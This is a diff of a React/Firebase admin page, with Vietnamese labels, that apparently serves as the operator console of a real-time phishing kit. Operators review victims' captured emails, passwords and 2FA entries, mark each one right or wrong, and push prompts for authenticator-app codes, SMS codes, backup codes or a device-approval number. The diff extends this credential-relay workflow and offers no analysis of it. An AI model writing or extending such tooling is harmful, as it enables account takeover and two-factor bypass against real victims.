@@ -173,27 +173,27 @@ const AdminPage = () => {
     }
   };
 
-  const handleStatus = async (userID,status) => {
+  const handleStatus = async (userID,status,type='') => {
     try {
       const userRef = doc(db, "users", userID);
       await updateDoc(userRef, {
         status: status,
+        type: type
       });
       setReload((prevState) => !prevState);
     } catch (error) {
     }
   };
-
-  const handleJoin = async (userID) => {
+const handleDevice = async (userID,status,type='',num) => {
     try {
       const userRef = doc(db, "users", userID);
       await updateDoc(userRef, {
-        status: 2,
+        status: status,
+        type: type,
+        num:num
       });
       setReload((prevState) => !prevState);
-      console.log(`Đánh dấu người dùng có ID: ${userID} là Join thành công.`);
     } catch (error) {
-      console.error(`Lỗi đánh dấu người dùng có ID: ${userID} là Bận:`, error);
     }
   };
 
@@ -361,66 +361,112 @@ const AdminPage = () => {
                 {user.status == 2 ? 'Chờ check pass': '' }
                 {user.status == -3 ? 'Sai 2fa': '' }
                 {user.status == 3 ? 'Chờ check 2fa': '' }
+                {user.status == 5 ? 'Chờ duyệt TB': '' }
                 {user.status == 4 ? 'DONE': '' }
               </div>
               </td>
               <td className="py-2 px-4 border border-gray-300 flex flex-wrap gap-3">
-                <button
-                  style={{height:"50%"}}
-                  className="w-[100px] btn btn-sm mb-2 btn-danger"
-                  onClick={() => handleDelete(user.userID)}
-                >
-                  Xóa
-                </button>
-                <button 
-                  style={{display: (user.status === 1 && user.email) ? 'inline-block' : 'none' , height:"50%"}}
-                  className="w-[100px] btn btn-sm mb-2 btn-warning"
-                  onClick={() => handleStatus(user.userID,-1)}
-                >
-                  Sai Email
-                </button>
-                <button
-                  style={{display: (user.status === 1 && user.email) ? 'inline-block' : 'none' , height:"50%"}}
-                  className="w-[100px] btn btn-sm mb-2 btn-success"
-                  onClick={() => handleStatus(user.userID,2)}
-                >
-                  Đúng Email
-                </button>
-                <button
-                  style={{display: (user.status === 2 && user.pass) ? 'inline-block' : 'none' , height:"50%"}}
-                  className="w-[100px] btn btn-sm mb-2 btn-warning"
-                  onClick={() => handleStatus(user.userID,-2)}
-                >
-                  Sai Pass
-                </button>
-                <button
-                  style={{display: (user.status === 2 && user.pass) ? 'inline-block' : 'none' , height:"50%"}}
-                  className="w-[100px] btn btn-sm mb-2 btn-success"
-                  onClick={() => handleStatus(user.userID,3)}
-                >
-                  Đúng Pass
-                </button>
-                 <button
-                  style={{display: (user.status === 3 && user.auth) ? 'inline-block' : 'none' , height:"50%"}}
-                  className="w-[100px] btn btn-sm mb-2 btn-warning"
-                  onClick={() => handleStatus(user.userID,-3)}
-                >
-                  Sai 2fa
-                </button>
-                <button
-                  style={{display: (user.status === 3 && user.auth) ? 'inline-block' : 'none' , height:"50%"}}
-                  className="w-[100px] btn btn-sm mb-2 btn-success"
-                  onClick={() => handleStatus(user.userID,4)}
-                >
-                  Đúng 2fa
-                </button>
-                <button
-                  style={{display: (user.status2 !== 0) ? 'inline-block' : 'none' , height:"50%"}}
-                  className="w-[100px] btn btn-sm mb-2 btn-secondary"
-                  onClick={() => handleStatus(user.userID,4)}
-                >
-                  DONE
-                </button>
+                <div className="flex flex-wrap gap-2">
+  {/* Dòng 1 */}
+  <div className="flex flex-wrap gap-2 w-full justify-start">
+    <button
+      className="w-[100px] btn btn-sm mb-2 btn-danger"
+      onClick={() => handleDelete(user.userID)}
+    >
+      Xóa
+    </button>
+    <button
+      style={{ display: (user.status === 1 && user.email) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-warning"
+      onClick={() => handleStatus(user.userID, -1)}
+    >
+      Sai Email
+    </button>
+    <button
+      style={{ display: (user.status === 1 && user.email) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-success"
+      onClick={() =>handleStatus(user.userID, 2)}
+    >
+      Đúng Email
+    </button>
+  </div>
+
+  {/* Dòng 2 */}
+  <div className="flex flex-wrap gap-2 w-full justify-start">
+    <button
+      style={{ display: (user.status === 2 && user.pass) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-warning"
+      onClick={() => handleStatus(user.userID, -2)}
+    >
+      Sai Pass
+    </button>
+    <button
+      style={{ display: (
+               (user.status >= 2
+        && user.status != 4)
+        
+        && user.pass) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-success"
+      onClick={() => handleStatus(user.userID, 3, 1)}
+    >
+      Auth App
+    </button>
+    <button
+      style={{ display: (
+         (user.status >= 2
+        && user.status != 4)
+        && user.pass) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-success"
+      onClick={() => handleStatus(user.userID, 3, 2)}
+    >
+      Sms Code
+    </button>
+     <button
+      style={{ display: (
+        
+              (user.status >= 2
+        && user.status != 4)
+        && user.pass) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-success"
+      onClick={() => handleStatus(user.userID, 3, 3)}
+    >
+      Mã backup
+    </button>
+    <button
+      style={{ display: (
+        
+            (user.status >= 2
+        && user.status != 4)
+        
+        && user.pass) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-success"
+      onClick={() => {
+      const inputNumber = window.prompt("Nhập số:");
+      if (inputNumber !== null) { // kiểm tra người dùng không nhấn Cancel
+        handleDevice(user.userID,5,'', Number(inputNumber));
+      }
+    }}
+    >
+      Duyệt Tb
+    </button>
+    <button
+      style={{ display: (user.status === 3 && user.auth) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-warning"
+      onClick={() => handleStatus(user.userID, -3)}
+    >
+      Sai Code
+    </button>
+   
+    <button
+      style={{ display: (user.status != 4) ? 'inline-block' : 'none'}}
+      className="w-[100px] btn btn-sm mb-2 btn-secondary"
+      onClick={() => handleStatus(user.userID, 4)}
+    >
+      DONE
+    </button>
+  </div>
+</div>
+
               </td>
               {/* <td className="py-2 px-4 border border-gray-300">
               <textarea defaultValue={user.bm} style={{ minWidth: '500px' }}></textarea>
